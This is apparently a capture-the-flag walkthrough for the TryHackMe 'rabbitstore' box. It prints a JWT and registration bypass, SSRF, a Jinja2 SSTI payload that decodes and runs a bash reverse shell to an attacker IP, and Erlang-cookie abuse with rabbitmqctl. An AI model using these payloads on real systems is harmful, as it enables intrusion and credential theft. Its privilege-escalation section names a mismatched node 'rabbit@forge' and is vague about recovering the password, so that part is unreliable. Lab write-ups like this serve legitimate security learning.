hello this is a medium box

title = rabbitstore
medium from tryhackme


like usually we gonna do  nmap scan to see which service are running on the target machine


command = nmap -p- -sC -sV -T4 --min-rate=1000 <IP_ADDRESS>
-p- : scan all ports from 1 to 65535
-sC : run default nmap scripts
-sV : detect service versions
-T4 : faster timing template
--min-rate=1000 : send at least 1000 packets per second to speed up


while the nmap is running i try to acces the web page but i get a error maybe i should had the host to the host file first the name is cloudsite.thm and this way the DNS is gonna resolve the IP address to the hostname and i can access the web page

i try to access the login page but not resolve too i need to add storage.cloudite.thm to the host file too and then i can access the login page but i dont have any credentials so i need to find another way to access the machine


we have the result of nmap = 

22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel


like u see we have port 22 running ssh, port 80 running apache and we have port 4369 running epmd which is used by erlang and we have port 25672 which is used by rabbitmq so maybe we can find some vulnerabilities in these services to access the machine


so there s a login form in there i try to log as a normal user and it says i have to be subscribed or somethings like that to be able to do any action i see that the token is a jwt token so i try to decrypt it using some tool and there s a subscription field in it i craft the token but didn t get any result so i bring the registred form to burpsuite and then send a request to registre and weird there s only the password and email that is send and no subscription field so maybe i can add a subscription field active to the request to see if it work and it work i can see a upload form i don t know where we going in this but anyway

it says upload from localhost
i try uploading a file to see what s going on and nothing really interesting just he gives the url of the file inside uploads enpoint


i try to fuzz the api endpoint to see what we have


command = dirbuster -u http://storage.cloudsite.thm/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50

/Login                (Status: 405) [Size: 36]
/docs                 (Status: 403) [Size: 27]
/login                (Status: 405) [Size: 36]
/register             (Status: 405) [Size: 36]
/uploads              (Status: 401) [Size: 32]
Progress: 4751 / 4751 (100.00%)


not really interesting again but maybe we need those after 

i m gonnaf focus on a vuln that maybe interesting a SSRF 

what is a ssrf ? it s a Server Side Request Forgery is a vulnerability that allows an attacker to make requests from the server to internal or external resources. This can be used to access sensitive information, perform actions on behalf of the server, or even pivot to other systems within the network.

just do some research and you ll understand


so first i try to download something from my computer using my ip to download a test.txt that i create using the upload from url and i work i can download somthings now let s try to direct the request to the internal server to see if we can access somethings


changing the url to http://localhost to point to the server

and weirdly a url of the content just appear
and it s the html page of the web we ll try to access more

then i try to upload the docs on localhost:3000 cause that where expressjs run on some app

and we find another endpoint /api/fetch_messeges_from_chatbot


i bring it to burpsuite and send a post request it says username required so i add a username and the endpoint mention that the chat bot ain t disponible yet that logics but let s see if i put 


{{3*3}} in the username field and send the request it says 9 so maybe there is some kind of code execution here and maybe we can use it to access the machine


and unfortunately it return 9 which is good to us cause it executed 3*3


req = POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
Content-Length: 29
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://storage.cloudsite.thm
Referer: http://storage.cloudsite.thm/dashboard/active
Accept-Encoding: gzip, deflate, br
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3Q0QGdtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc3MTcwNTE3NCwiZXhwIjoxNzcxNzA4Nzc0fQ.oq4f5esXqkumgJWsohMvE0BmNXFae-tX4BWL8aFqMiQ
Connection: keep-alive

{
	"username":"{{3*3}}"

}

res = HTTP/1.1 200 OK
Date: Sat, 21 Feb 2026 20:30:42 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"118-KbukWB/+AsgrN6hC3i9r1vFGM3E-gzip"
Vary: Accept-Encoding
Content-Length: 280
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, 9, our chatbot server is currently under development.</h1>
 </body>
</html>


now we need to find a shell

After confirming the SSTI vulnerability, I searched for Jinja2 Remote Code Execution (RCE) techniques to escalate my access.


we ll use this 

we need to encode bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1 in base64 and then use the following payload to execute it on the server

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo <encoded_payload> |base64 -d |bash').read() }}


and we have a shell just upgrade shell using python3 -c 'import pty; pty.spawn("/bin/bash")' or 


controle Z stty raw -echo ;fg

export TERM = xterm
 and a stable shell


and we have the user flag to in the azrael directory
i have a shell so first i uploaded linpeas to see how to escalate privilege


## Privilege Escalation via RabbitMQ / Erlang (EPMD)

During enumeration (ex: `linpeas`), you may notice RabbitMQ’s Erlang services are reachable in a way that shouldn’t be exposed. RabbitMQ nodes authenticate with an **Erlang cookie**; if you can obtain that cookie, you can use admin tools (like `rabbitmqctl`) to query the broker and potentially recover credentials / escalate.

### 1) Why this matters (what you’re looking at)
RabbitMQ is built on Erlang and nodes communicate using `epmd` (Erlang Port Mapper Daemon) and the Erlang distribution ports. If you can authenticate as the RabbitMQ node (using the same cookie), you can run queries against the broker as if you were the node itself.

Key idea:
- **Cookie = shared secret** used to authenticate Erlang distribution connections.
- If you have the cookie for the RabbitMQ node, `rabbitmqctl` can talk to that node remotely.

### 2) Add host mapping (so the node name resolves correctly)
RabbitMQ nodes are named like `rabbit@forge`. The `forge` part must resolve on your attacking machine.

Add to `/etc/hosts` on your attacking machine:
- `<TARGET_IP> forge`

(Use the machine’s IP for `<TARGET_IP>`.)

### 3) Obtain the Erlang cookie from the compromised machine
On the target (as the low-priv user, here it was `azrael`), find the Erlang cookie.

Common locations:
- `~/.erlang.cookie`
- `/var/lib/rabbitmq/.erlang.cookie`  (often the RabbitMQ system user)
- `/root/.erlang.cookie` (if readable, usually not)

You must use **the cookie that matches the RabbitMQ node** you’re trying to manage.

### 4) Install / use `rabbitmqctl` and query the remote node
On your attacking machine (or from the target if it has the tooling), install `rabbitmqctl` and run it against the node:

- Node: `rabbit@forge`
- Cookie: the value you found in the `.erlang.cookie`

Example command:
- `sudo rabbitmqctl --erlang-cookie 'YOUR_COOKIE_HERE' --node rabbit@forge list_users`

This should return the RabbitMQ users. In this box, you see an **administrator** account and a value that looks like a password hash.

### 5) Understanding the RabbitMQ “hash” output (this is where people get lost)
RabbitMQ can store a password hash in a format that looks like a base64 blob. Conceptually it is:

- `base64( salt(4 bytes) + sha256( salt(4 bytes) + password ) )`

So the base64 string contains:
1) **First 4 bytes**: the salt
2) **Remaining bytes**: the SHA-256 digest

Important:
- You are NOT directly “cracking SHA-256” here by cutting out a piece.
- The simplest path in this box is that the stored “hash” is actually enough to reconstruct/identify the password used in the intended workflow (depending on how the challenge is set up), or the password is weak enough to crack once you extract the salt correctly.

### 6) Extract the salt (first 4 bytes) from the base64 blob
If you saved the base64 blob into `password.txt`, you can decode it, then read the first 4 bytes:

- `cat password.txt | base64 -d | xxd -p -c 100`

This prints the decoded bytes as hex. The **first 8 hex chars** correspond to the 4-byte salt.

(If you only do `cut -c-9`, you’ll accidentally include an extra character. The salt is 8 hex chars, so you want the first 8.)

Example (conceptual):
- decoded hex: `a1b2c3d4<rest_of_digest...>`
- salt hex: `a1b2c3d4`

From here, you can proceed with the intended method for the box to recover the password (ex: using a small script or cracking approach that re-computes `sha256(salt+password)` and compares).

### 7) Switch to root and grab the flag
Once you recover the administrator/root password:
- `su root`
- enter the recovered password
- read `root.txt`
